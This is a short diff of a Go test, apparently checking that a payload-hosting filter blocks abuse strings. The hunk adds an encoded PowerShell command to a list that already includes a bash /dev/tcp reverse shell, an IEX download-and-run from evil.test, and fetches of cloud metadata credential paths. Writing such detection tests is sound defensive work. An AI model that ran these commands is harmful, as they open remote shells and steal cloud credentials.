@@ -82,6 +82,7 @@ func TestPayloadHostingPatternsBlockAbuse(t *testing.T) {
 		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
 		"IEX(New-Object Net.WebClient).DownloadString('http://evil.test/p.ps1')",
 		"powershell -enc SQBFAFgA",
+		"powershell.exe -NoProfile -EncodedCommand SQBFAFgA",
 		"fetch http://instance-data.example/latest/meta-data/iam/security-credentials/",
 		"fetch http://metadata-alias.example/computeMetadata/v1/instance/",
 		`document.domain = "victim.example";`,
